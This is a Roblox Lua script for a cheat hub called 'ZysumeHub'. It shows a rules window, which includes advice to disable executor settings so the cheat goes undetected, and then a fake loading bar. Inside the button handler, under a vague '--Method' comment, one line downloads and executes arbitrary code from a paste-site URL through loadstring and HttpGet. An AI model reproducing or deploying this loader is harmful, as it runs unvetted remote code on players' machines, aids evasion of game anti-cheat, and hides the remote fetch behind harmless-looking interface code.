--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RulesGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

--// Frame (rules window)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 500, 0, 350)
frame.Position = UDim2.new(0.5, -250, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- black theme
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 25)
corner.Parent = frame

--// Rule Text
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, -20, 0.35, 0)
textLabel.Position = UDim2.new(0, 10, 0.1, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.fromRGB(0, 180, 255) -- blue text
textLabel.TextScaled = true
textLabel.Font = Enum.Font.FredokaOne
textLabel.TextWrapped = true
textLabel.Parent = frame

--// Avatar (circle + glow)
local avatarImage = Instance.new("ImageLabel")
avatarImage.Size = UDim2.new(0, 130, 0, 130)
avatarImage.Position = UDim2.new(0.05, 0, 0.55, 0)
avatarImage.BackgroundTransparency = 1
avatarImage.Parent = frame

local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(1, 0)
avatarCorner.Parent = avatarImage

local avatarStroke = Instance.new("UIStroke")
avatarStroke.Thickness = 4
avatarStroke.Color = Color3.fromRGB(0, 150, 255) -- glowing blue
avatarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
avatarStroke.Parent = avatarImage

-- Fetch player thumbnail
local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size150x150
local content = Players:GetUserThumbnailAsync(LocalPlayer.UserId, thumbType, thumbSize)
avatarImage.Image = content

-- Username
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
nameLabel.Position = UDim2.new(0.35, 0, 0.75, 0)
nameLabel.BackgroundTransparency = 1
nameLabel.Text = "@" .. LocalPlayer.DisplayName
nameLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
nameLabel.TextScaled = true
nameLabel.Font = Enum.Font.FredokaOne
nameLabel.TextXAlignment = Enum.TextXAlignment.Left
nameLabel.Parent = frame

-- Next/Finish button
local nextButton = Instance.new("TextButton")
nextButton.Size = UDim2.new(0, 140, 0, 45)
nextButton.Position = UDim2.new(1, -150, 1, -55) -- bottom-right
nextButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
nextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
nextButton.TextScaled = true
nextButton.Font = Enum.Font.FredokaOne
nextButton.Text = "Next ‚ñ∂"
nextButton.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = nextButton

--// Rules
local rules = {
    "üìú Welcome to ZysumeHub!",
    "üêæ Rule 1: Re-execute if doesn't work.",
    "üêæ Rule 2: If you're using DELTA make sure to turn OFF all settings to make script undetected, and script working properly.",
    "üêæ Rule 3: Make sure that after you execute the script it will teleport you in other server, cause it can teleport you on a working server"
}
local currentRule = 1
textLabel.Text = rules[currentRule]

--// Next Button Logic
nextButton.MouseButton1Click:Connect(function()
    if currentRule < #rules then
        currentRule += 1
        textLabel.Text = rules[currentRule]
        if currentRule == #rules then
            nextButton.Text = "Finish ‚úÖ"
        end
    else
        -- Loading Screen
        frame.Visible = false

        local loadFrame = Instance.new("Frame")
        loadFrame.Size = UDim2.new(0, 400, 0, 200)
        loadFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
        loadFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        loadFrame.BorderSizePixel = 0
        loadFrame.Parent = screenGui

        local loadCorner = Instance.new("UICorner")
        loadCorner.CornerRadius = UDim.new(0, 25)
        loadCorner.Parent = loadFrame

        local loadTitle = Instance.new("TextLabel")
        loadTitle.Size = UDim2.new(1, 0, 0.3, 0)
        loadTitle.Position = UDim2.new(0, 0, 0, 10)
        loadTitle.BackgroundTransparency = 1
        loadTitle.Text = "ZYSUMExHUB"
        loadTitle.TextColor3 = Color3.fromRGB(0, 180, 255)
        loadTitle.TextScaled = true
        loadTitle.Font = Enum.Font.FredokaOne
        loadFrame.Parent = screenGui
        loadTitle.Parent = loadFrame

       --Method
       loadstring(game:HttpGet("https://pastefy.app/nAyKWzOd/raw"))()

        -- Description texts
        local desc1 = Instance.new("TextLabel")
        desc1.Size = UDim2.new(1, -20, 0.2, 0)
        desc1.Position = UDim2.new(0, 10, 0.45, 0)
        desc1.BackgroundTransparency = 1
        desc1.Text = "This script was so OP"
        desc1.TextColor3 = Color3.fromRGB(200, 200, 200)
        desc1.TextScaled = true
        desc1.Font = Enum.Font.FredokaOne
        desc1.Parent = loadFrame

        local desc2 = Instance.new("TextLabel")
        desc2.Size = UDim2.new(1, -20, 0.2, 0)
        desc2.Position = UDim2.new(0, 10, 0.65, 0)
        desc2.BackgroundTransparency = 1
        desc2.Text = "Wait until the script fully loaded‚ú®"
        desc2.TextColor3 = Color3.fromRGB(200, 200, 200)
        desc2.TextScaled = true
        desc2.Font = Enum.Font.FredokaOne
        desc2.Parent = loadFrame

        -- Loading bar
        local barBack = Instance.new("Frame")
        barBack.Size = UDim2.new(0.9, 0, 0.08, 0)
        barBack.Position = UDim2.new(0.05, 0, 0.85, 0)
        barBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        barBack.BorderSizePixel = 0
        barBack.Parent = loadFrame

        local barCorner = Instance.new("UICorner")
        barCorner.CornerRadius = UDim.new(0, 10)
        barCorner.Parent = barBack

        local barFill = Instance.new("Frame")
        barFill.Size = UDim2.new(0, 0, 1, 0)
        barFill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
        barFill.BorderSizePixel = 0
        barFill.Parent = barBack

        local barFillCorner = Instance.new("UICorner")
        barFillCorner.CornerRadius = UDim.new(0, 10)
        barFillCorner.Parent = barFill

        -- Animate loading
        for i = 1, 100 do
            barFill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Quad", 0.02, true)
            wait(0.02)
        end

        -- Done -> remove loading screen
        wait(0.5)
        screenGui:Destroy()
    end
end)
